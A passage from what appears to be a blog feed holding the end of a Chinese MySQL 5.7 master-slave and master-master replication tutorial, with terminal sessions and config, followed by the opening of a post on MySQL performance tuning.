MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.19 Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; stop slave;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; change master to master_host=&apos;192.168.10.67&apos;,master_user=&apos;slave&apos;,master_password=&apos;Jaking@vip.163.com&apos;;Query OK, 0 rows affected, 2 warnings (0.00 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\G*************************** 1. row ***************************Slave_IO_State: Waiting for master to send eventMaster_Host: 192.168.10.67Master_User: slaveMaster_Port: 3306Connect_Retry: 60Master_Log_File: mysql&#x2010;bin&#x2010;master.000002Read_Master_Log_Pos: 601Relay_Log_File: MySQL2&#x2010;relay&#x2010;bin.000003Relay_Log_Pos: 828Relay_Master_Log_File: mysql&#x2010;bin&#x2010;master.000002Slave_IO_Running: YesSlave_SQL_Running: Yes</code></pre><p>Slave_IO_Running &#xFF1A;&#x4E00;&#x4E2A;&#x8D1F;&#x8D23;&#x4E0E;&#x4E3B;&#x673A;&#x7684;IO&#x901A;&#x4FE1;<br>Slave_SQL_Running&#xFF1A;&#x8D1F;&#x8D23;&#x81EA;&#x5DF1;&#x7684;slave mysql&#x8FDB;&#x7A0B;<br>&#x4E24;&#x4E2A;&#x4E3A; Yes &#x5C31;&#x6210;&#x529F;&#x4E86;&#xFF01;  </p><p>&#x518D;&#x5230;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x4E0A;&#x67E5;&#x770B;&#x72B6;&#x6001;  </p><pre><code class="sql">1 [root@MySQL1 mysql&#x2010;5.7.19]# mysql &#x2010;uroot &#x2010;pJaking@vip.163.com2 mysql: [Warning] Using a password on the command line interface can be insecure.3 Welcome to the MySQL monitor. Commands end with ; or \g.4 Your MySQL connection id is 75 Server version: 5.7.19&#x2010;log Source distribution67 Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.89 Oracle is a registered trademark of Oracle Corporation and/or its10 affiliates. Other names may be trademarks of their respective11 owners.1213 Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.1415 mysql&gt; show processlist\G16 *************************** 1. row ***************************17  Id: 618  User: slave19  Host: 192.168.10.68:5465620  db: NULL21 Command: Binlog Dump22  Time: 16523  State: Master TESTDBs sent all binlog to slave; waiting for more updates24  Info: NULL25 *************************** 2. row ***************************26  Id: 727  User: root28  Host: localhost29  db: NULL30 Command: Query31  Time: 032  State: starting33  Info: show processlist34 2 rows in set (0.00 sec)3536 mysql&gt;</code></pre><p>&#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;</p><pre><code class="sql">[root@MySQL1 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 11Server version: 5.7.19-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                || testdb             |+--------------------+5 rows in set (0.00 sec)mysql&gt; use testdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_testdb |+------------------+| table666         |+------------------+1 row in set (0.00 sec)mysql&gt; select * from table666;Empty set (0.00 sec)mysql&gt; INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;SYS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         |+---------+--------+-------+------------+6 rows in set (0.00 sec)mysql&gt; ^DBye[root@MySQL1 ~]#</code></pre><pre><code class="sql">[root@MySQL2 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 9Server version: 5.7.19 MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; select * from testdb.table666;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         |+---------+--------+-------+------------+6 rows in set (0.00 sec)mysql&gt; </code></pre><p>&#x4E3B;&#x5E93;</p><pre><code class="sql">mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         ||       6 | MySQL3 |    73 | QH         |+---------+--------+-------+------------+6 rows in set (0.00 sec)mysql&gt; delete from table666 where bName=&quot;MySQL3&quot;;Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         |+---------+--------+-------+------------+5 rows in set (0.00 sec)mysql&gt; </code></pre><p>&#x4ECE;&#x5E93;</p><pre><code class="sql">mysql&gt; select * from testdb.table666;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         |+---------+--------+-------+------------+5 rows in set (0.00 sec)</code></pre><p>&#x4E3B;&#x5E93;</p><pre><code class="sql">mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName  | price | publishing |+---------+--------+-------+------------+|       1 | Linux  |    66 | DZ         ||       2 | CLD    |    68 | RM         ||       3 | SYS    |    90 | JX         ||       4 | MySQL1 |    71 | QH         ||       5 | MySQL2 |    72 | QH         |+---------+--------+-------+------------+5 rows in set (0.00 sec)mysql&gt; INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;666&apos;,&apos;Linux666&apos;,&apos;666&apos;,&apos;QH&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table666;                                                 +---------+----------+-------+------------+| bTypeId | bName    | price | publishing |+---------+----------+-------+------------+|       1 | Linux    |    66 | DZ         ||       2 | CLD      |    68 | RM         ||       3 | SYS      |    90 | JX         ||       4 | MySQL1   |    71 | QH         ||       5 | MySQL2   |    72 | QH         ||     666 | Linux666 |   666 | QH         |+---------+----------+-------+------------+6 rows in set (0.00 sec)mysql&gt;</code></pre><p>&#x4ECE;&#x5E93;</p><pre><code class="sql">mysql&gt; select * from testdb.table666;+---------+----------+-------+------------+| bTypeId | bName    | price | publishing |+---------+----------+-------+------------+|       1 | Linux    |    66 | DZ         ||       2 | CLD      |    68 | RM         ||       3 | SYS      |    90 | JX         ||       4 | MySQL1   |    71 | QH         ||       5 | MySQL2   |    72 | QH         ||     666 | Linux666 |   666 | QH         |+---------+----------+-------+------------+6 rows in set (0.00 sec)mysql&gt;</code></pre><h2 id="&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;"><a href="#&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;" class="headerlink" title="&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;"></a>&#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;</h2><h2 id="&#x7EC3;&#x4E60;&#xFF1A;1-&#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;-2-&#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;"><a href="#&#x7EC3;&#x4E60;&#xFF1A;1-&#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;-2-&#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;" class="headerlink" title="&#x7EC3;&#x4E60;&#xFF1A;1. &#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;  2. &#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;"></a>&#x7EC3;&#x4E60;&#xFF1A;1. &#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE;  2. &#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;</h2><p>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;  </p><p>master_1:</p><pre><code>bind-address    = 0.0.0.0   # &#x542F;&#x7528;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;log-bin=mysql-bin   # &#x6B65;&#x8FDB;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x6709;n&#x53F0;master&#xFF0C;&#x5C31;&#x586B;n&#xFF1A;auto_increment_increment=2# &#x8D77;&#x59CB;&#x503C;&#xFF0C;&#x4E00;&#x822C;&#x586B;&#x7B2C;n&#x53F0;master&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x7B2C;1&#x53F0;&#x4E3B;MySQLauto_increment_offset=1server-id=1lower_case_table_names=1</code></pre><p>master_2:</p><pre><code>auto_increment_increment=2auto_increment_offset=2log-bin=mysql-binbinlog_format=mixedserver-id=2lower_case_table_names=1</code></pre><p># &#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5230;master_2<br>master_1:</p><pre><code>mysqldump -uroot -p -A &gt; all_db.sqlscp all_db.sql master_2_user@master_2_ipaddr:~/</code></pre><p>master_2:</p><pre><code>mysql -uroot -p &lt; all.db.sql</code></pre><p># &#x8BB0;&#x5F55;bin-log&#x6587;&#x4EF6;&#x8DDF;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x6388;&#x6743;&#x7ED9;&#x5BF9;&#x65B9;</p><p>#&#x4F8B;&#x5982;&#xFF1A;<br>master_1:</p><pre><code>show master status;</code></pre><p>#&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;master&#xFF1A;</p><pre><code class="sql">GRANT REPLICATION SLAVE ON *.* TO slave@&apos;master_2_ipaddr&apos; IDENTIFIED BY &#x2018;slave_password&#x2019;;STOP SLAVE;CHANGE MASTER TO master_host=&apos;master_2_ipaddr&apos;,master_user=&apos;slave&apos;,master_password=&apos;slave_password&apos;,master_log_file=&apos;mysql-bin.000005&apos;,master_log_pos=13756331;FLUSH PRIVILEGES;START SLAVE;SHOW SLAVE STATUS\G</code></pre><p>master_2:</p><h1 id="&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser"><a href="#&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser" class="headerlink" title="&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser"></a>&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser</h1><pre><code class="sql">GRANT REPLICATION SLAVE ON *.* TO slave@&apos;master_1_ipaddr&apos; IDENTIFIED BY &#x2018;slave_password&#x2019;;FLUSH PRIVILEGES;STOP SLAVE;CHANGE MASTER TO master_host=&apos;master_1_ipaddr&apos;,master_user=&apos;slave&apos;,master_password=&apos;slave_password&apos;,master_log_file=&apos;mysql-bin.000001&apos;,mysql_log_pos=1022;FLUSH PRIVILEGES;START SLAVE;SHOW SLAVE STATUS\G</code></pre><p>&#x53C2;&#x8003;&#xFF1A;<a href="https://www.smister.com/post-41/mysql-master-master.html" target="_blank" rel="noopener">https://www.smister.com/post-41/mysql-master-master.html</a></p><p># &#x5728;&#x539F;&#x6709;&#x4E3B;&#x4ECE;&#x4E0A; &#x65B0;&#x589E;&#x4ECE;&#x5E93;</p><p>MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x4E4B;&#x4E0D;&#x505C;&#x673A;&#x91CD;&#x5EFA;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#xFF08;&#x5B9E;&#x6218;&#xFF09;<br><a href="https://note.youdao.com/s/bHvxKKyK" target="_blank" rel="noopener">https://note.youdao.com/s/bHvxKKyK</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x73AF;&amp;#x5883;&quot;&gt;&lt;a href=&quot;#&amp;#x73AF;&amp;#x5883;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x73AF;&amp;#x5883;&quot;&gt;&lt;/a&gt;&amp;#x73AF;&amp;#x5883;&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL调优</title>
    <link href="https://marnm.github.io//posts/208cd020/"/>
    <id>https://marnm.github.io//posts/208cd020/</id>
    <published>2022-06-07T04:44:39.000Z</published>
    <updated>2022-06-07T05:13:22.242Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;"><a href="#&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;" class="headerlink" title="&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;"></a>&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;</h3><p>1&#x3001; &#x6B64;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6982;&#x8FF0;&#xFF1A;&#x540D;&#x79F0;&#xFF0C;&#x529F;&#x80FD;&#xFF0C;&#x7279;&#x70B9;&#xFF0C;&#x7AEF;&#x53E3;&#x53F7;<br>2&#x3001; &#x5B89;&#x88C5;<br>3&#x3001; &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;<br>4&#x3001; &#x670D;&#x52A1;&#x542F;&#x52A8;&#x5173;&#x95ED;&#x811A;&#x672C;&#xFF0C;&#x67E5;&#x770B;&#x7AEF;&#x53E3;<br>5&#x3001; &#x6B64;&#x670D;&#x52A1;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;<br>6&#x3001; &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5B9E;&#x6218;&#x4E3E;&#x4F8B;<br>7&#x3001; &#x6392;&#x9519;&#xFF08;&#x4ECE;&#x4E0B;&#x5230;&#x4E0A;&#xFF0C;&#x4ECE;&#x5185;&#x5230;&#x5916;&#xFF09;  </p><h3 id="&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;"><a href="#&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;" class="headerlink" title="&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;"></a>&#x672C;&#x8282;&#x6240;&#x5B66;&#x5185;&#x5BB9;&#xFF1A;</h3><p>&#x2022; &#x8C03;&#x4F18;&#x601D;&#x8DEF;&#xFF1A;<br>&#x2022; 0.&#x786C;&#x4EF6;&#x4F18;&#x5316;<br>&#x2022; 1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#x2013;&#x4EE5;&#x540E;&#x518D;&#x4FEE;&#x6539;&#x5F88;&#x9EBB;&#x70E6;&#xFF0C;&#x4F30;&#x8BA1;&#x6570;&#x636E;&#x91CF;&#xFF0C;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;&#x5B58;&#x50A8;&#x5F15;&#x64CE;<br>&#x2022; 2.&#x6570;&#x636E;&#x7684;&#x5E94;&#x7528;&#x2013;&#x600E;&#x6837;&#x53D6;&#x6570;&#x636E;&#xFF0C;sql &#x8BED;&#x53E5;&#x7684;&#x4F18;&#x5316;<br>&#x2022; 3.&#x78C1;&#x76D8; io &#x4F18;&#x5316;<br>&#x2022; 4.&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7684;&#x4F18;&#x5316;&#x2013;&#x5185;&#x6838;&#x3001;tcp &#x8FDE;&#x63A5;&#x6570;&#x91CF;<br>&#x2022; 5.mysql &#x670D;&#x52A1;&#x4F18;&#x5316;&#x2013;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#xFF0C;&#x78C1;&#x76D8;&#x7684;&#x4F7F;&#x7528;<br>&#x2022; 6.my.cnf &#x5185;&#x53C2;&#x6570;&#x7684;&#x4F18;&#x5316;<br>&#x2022; 7 &#x5206;&#x5E93;&#x5206;&#x8868;&#x601D;&#x8DEF;&#x548C;&#x4F18;&#x52A3;  </p><h3 id="0-&#x786C;&#x4EF6;&#x4F18;&#x5316;"><a href="#0-&#x786C;&#x4EF6;&#x4F18;&#x5316;" class="headerlink" title="0.&#x786C;&#x4EF6;&#x4F18;&#x5316;"></a>0.&#x786C;&#x4EF6;&#x4F18;&#x5316;</h3><p>CPU&#x2014;&#x2014; 64 &#x4F4D;&#x3001;&#x9AD8;&#x4E3B;&#x9891;&#x3001;&#x9AD8;&#x7F13;&#x5B58;&#xFF0C;&#x9AD8;&#x5E76;&#x884C;&#x5904;&#x7406;&#x80FD;&#x529B;<br>&#x5185;&#x5B58;&#x2014;&#x2014;&#x5927;&#x5185;&#x5B58;&#x3001;&#x4E3B;&#x9891;&#x9AD8;&#xFF0C;&#x5C3D;&#x91CF;&#x4E0D;&#x8981;&#x7528; SWAP<br>&#x786C;&#x76D8;&#x2014;&#x2014;15000&#x8F6C;&#x3001;RAID5&#x3001;RAID10 &#x3001; SSD<br>&#x7F51;&#x7EDC;&#x2014;&#x2014;&#x6807;&#x914D;&#x7684;&#x5343;&#x5146;&#x7F51;&#x5361;&#xFF0C;10G&#x7F51;&#x5361;&#xFF0C;bond0&#xFF0C;MySQL&#x670D;&#x52A1;&#x5668;&#x5C3D;&#x53EF;&#x80FD;&#x548C;&#x4F7F;&#x7528;&#x5B83;&#x7684;web&#x670D;&#x52A1;&#x5668;&#x5728;&#x540C;&#x4E00;&#x5C40;&#x57DF;&#x7F51;&#x5185;&#xFF0C;&#x5C3D;&#x91CF;&#x907F;&#x514D;&#x8BF8;&#x5982;&#x9632;&#x706B;&#x5899;&#x7B56;&#x7565;&#x7B49;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x5F00;&#x9500;&#x3002;  </p><h3 id="1-&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;"><a href="#1-&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;" class="headerlink" title="1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;)"></a>1.&#x6570;&#x636E;&#x5E93;&#x8BBE;&#x8BA1;&#x4E0E;&#x89C4;&#x5212;&#xFF08;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x4F18;&#x5316;)</h3><p>&#x7EB5;&#x5411;&#x62C6;&#x89E3;: &#x4E13;&#x673A;&#x4E13;&#x7528;<br>&#x4F8B;&#xFF1A;&#x73B0;&#x5728;&#x516C;&#x53F8;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x8D1F;&#x8D23; web&#x3001;ftp&#x3001;&#x6570;&#x636E;&#x5E93;&#x7B49;&#x591A;&#x4E2A;&#x89D2;&#x8272;&#x3002; R720 dell &#x5185;&#x5B58; &#xFF1A;768G<br>&#x7EB5;&#x5411;&#x62C6;&#x89E3;&#x540E;&#x5C31;&#x662F;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x4E13;&#x673A;&#x4E13;&#x7528;&#xFF0C;&#x907F;&#x514D;&#x989D;&#x5916;&#x7684;&#x670D;&#x52A1;&#x53EF;&#x80FD;&#x5BFC;&#x81F4;&#x7684;&#x6027;&#x80FD;&#x4E0B;&#x964D;&#x548C;&#x4E0D;&#x7A33;&#x5B9A;&#x6027;&#x3002; </p><p>&#x6A2A;&#x5411;&#x62C6;&#x89E3;: &#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x3001;&#x8D1F;&#x8F7D;&#x5747;&#x8861;&#x3001;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x96C6;&#x7FA4;&#xFF0C;&#x5F53;&#x5355;&#x4E2A; mysql &#x6570;&#x636E;&#x5E93;&#x65E0;&#x6CD5;&#x6EE1;&#x8DB3;&#x65E5;&#x76CA;&#x589E;&#x52A0;&#x7684;&#x9700;&#x6C42;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x5728;&#x6570;&#x636E;&#x5E93;&#x8FD9;&#x4E2A;&#x903B;&#x8F91;&#x5C42;&#x9762;&#x589E;&#x52A0;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x7A33;&#x5B9A;&#x3001;&#x9AD8;&#x6548;&#x7684;&#x6548;&#x679C;&#x3002;  </p><h3 id="2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;"><a href="#2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;" class="headerlink" title="2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;"></a>2&#x3001;&#x67E5;&#x8BE2;&#x4F18;&#x5316;</h3><p>a&gt;&#x5EFA;&#x8868;&#x65F6;&#x8868;&#x7ED3;&#x6784;&#x8981;&#x5408;&#x7406;&#xFF0C;&#x6BCF;&#x4E2A;&#x8868;&#x4E0D;&#x5B9C;&#x8FC7;&#x5927;&#xFF1B;&#x5728;&#x4EFB;&#x4F55;&#x60C5;&#x51B5;&#x4E0B;&#x5747;&#x5E94;&#x4F7F;&#x7528;&#x6700;&#x7CBE;&#x786E;&#x7684;&#x7C7B;&#x578B;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;ID&#x5217;&#x7528;int&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x4E3B;&#x610F;&#xFF0C;&#x800C;&#x7528;text&#x7C7B;&#x578B;&#x5219;&#x662F;&#x4E2A;&#x8822;&#x529E;&#x6CD5;&#xFF1B;TIME&#x5217;&#x914C;&#x60C5;&#x4F7F;&#x7528;DATE&#x6216;&#x8005;DATETIME&#x3002;<br>b&gt;&#x7D22;&#x5F15;&#xFF0C;&#x5EFA;&#x7ACB;&#x5408;&#x9002;&#x7684;&#x7D22;&#x5F15;&#x3002;<br>c&gt;&#x67E5;&#x8BE2;&#x65F6;&#x5C3D;&#x91CF;&#x51CF;&#x5C11;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#xFF08;&#x4E0E;&#x8FD0;&#x7B97;&#x3001;&#x6216;&#x8FD0;&#x7B97;&#x3001;&#x5927;&#x4E8E;&#x5C0F;&#x4E8E;&#x67D0;&#x503C;&#x7684;&#x8FD0;&#x7B97;&#xFF09;&#xFF1B;<br>d&gt;&#x51CF;&#x5C11;&#x4E0D;&#x5F53;&#x7684;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#xFF0C;&#x4E0D;&#x8981;&#x67E5;&#x8BE2;&#x5E94;&#x7528;&#x4E2D;&#x4E0D;&#x9700;&#x8981;&#x7684;&#x5217;&#xFF0C;&#x6BD4;&#x5982;&#x8BF4;select * from &#x7B49;&#x64CD;&#x4F5C;&#x3002;<br>e&gt;&#x51CF;&#x5C0F;&#x4E8B;&#x52A1;&#x5305;&#x7684;&#x5927;&#x5C0F;&#xFF1B;<br>f&gt;&#x5C06;&#x591A;&#x4E2A;&#x5C0F;&#x7684;&#x67E5;&#x8BE2;&#x9002;&#x5F53;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#x5927;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x51CF;&#x5C11;&#x6BCF;&#x6B21;&#x5EFA;&#x7ACB;/&#x5173;&#x95ED;&#x67E5;&#x8BE2;&#x65F6;&#x7684;&#x5F00;&#x9500;&#xFF1B;<br>g&gt;&#x5C06;&#x67D0;&#x4E9B;&#x8FC7;&#x4E8E;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#x62C6;&#x89E3;&#x6210;&#x591A;&#x4E2A;&#x5C0F;&#x67E5;&#x8BE2;&#xFF0C;&#x548C;&#x4E0A;&#x4E00;&#x6761;&#x6070;&#x597D;&#x76F8;&#x53CD;<br>h&gt;&#x5EFA;&#x7ACB;&#x548C;&#x4F18;&#x5316;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x6765;&#x4EE3;&#x66FF;&#x5927;&#x91CF;&#x7684;&#x5916;&#x90E8;&#x7A0B;&#x5E8F;&#x4EA4;&#x4E92;&#x3002;  </p><h3 id="3&#xFF0C;&#x78C1;&#x76D8;-IO-&#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;"><a href="#3&#xFF0C;&#x78C1;&#x76D8;-IO-&#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;" class="headerlink" title="3&#xFF0C;&#x78C1;&#x76D8; IO &#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;"></a>3&#xFF0C;&#x78C1;&#x76D8; IO &#x89C4;&#x5212;&#xFF0C;IO&#x76F8;&#x5173;&#x7684;&#x6280;&#x672F;</h3><p>RAID 